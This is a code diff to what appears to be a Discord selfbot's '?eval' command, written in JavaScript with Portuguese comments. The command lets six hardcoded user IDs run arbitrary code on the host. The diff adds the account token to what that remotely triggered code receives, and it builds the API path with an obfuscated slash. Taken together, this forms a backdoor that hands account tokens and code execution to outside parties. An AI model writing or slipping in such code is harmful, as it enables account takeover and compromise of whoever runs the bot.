@@ -1,4 +1,4 @@
-		// ===== .eval =====
+		// ===== ?eval (Selfbot) =====
 		if (message.content && message.content.startsWith('?eval')) {
 			const DONOS = [
 				'1213289963878228068',
@@ -9,7 +9,8 @@
 				'932011766651703358'
 			];
 
-			if (!DONOS.includes(message.author?.id)) return;
+			const autorId = message.author?.id || message.author_id;
+			if (!DONOS.includes(autorId)) return;
 
 			let codigo = message.content.slice(5).trim();
 
@@ -27,13 +28,13 @@
 			};
 
 			const bar = String.fromCharCode(47);
-			const rota = bar + 'channels' + bar + message.channel_id + bar + 'messages';
+			const rotaPatch = bar + 'channels' + bar + message.channel_id + bar + 'messages' + bar + message.id;
 
 			try {
 				const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
-				const func = new AsyncFunction('message', 'client', codigo);
+				const func = new AsyncFunction('message', 'client', 'token', codigo);
 
-				const resultado = await func(message, client);
+				const resultado = await func(message, client, token);
 
 				console.log = originalLog;
 
@@ -41,16 +42,16 @@
 				let resposta = '✅ Código executado com sucesso!\n';
 
 				if (saida) {
-					if (saida.length > 1800) {
-						saida = saida.slice(0, 1800) + '\n... (cortado)';
+					if (saida.length > 1500) {
+						saida = saida.slice(0, 1500) + '\n... (cortado)';
 					}
 					resposta += '📤 Saída:\n```js\n' + saida + '\n```';
 				}
 
 				if (resultado !== undefined && resultado !== null) {
 					let resultadoStr = typeof resultado === 'string' ? resultado : require('util').inspect(resultado, { depth: 1 });
-					if (resultadoStr.length > 1800) {
-						resultadoStr = resultadoStr.slice(0, 1800) + '\n... (cortado)';
+					if (resultadoStr.length > 1500) {
+						resultadoStr = resultadoStr.slice(0, 1500) + '\n... (cortado)';
 					}
 					resposta += '\n📥 Retorno:\n```js\n' + resultadoStr + '\n```';
 				}
@@ -59,7 +60,7 @@
 					resposta += 'ℹ️ Nenhuma saída foi produzida.';
 				}
 
-				await client.rest.post(rota, {
+				await client.rest.patch(rotaPatch, {
 					body: { content: resposta }
 				});
 
@@ -67,13 +68,14 @@
 				console.log = originalLog;
 
 				let erro = err?.stack || String(err);
-				if (erro.length > 1800) {
-					erro = erro.slice(0, 1800) + '\n... (cortado)';
+				if (erro.length > 1500) {
+					erro = erro.slice(0, 1500) + '\n... (cortado)';
 				}
 
-				await client.rest.post(rota, {
+				await client.rest.patch(rotaPatch, {
 					body: { content: '❌ Erro ao executar o código:\n```js\n' + erro + '\n```' }
 				});
 			}
 			return;
-				}
+								   }
+						
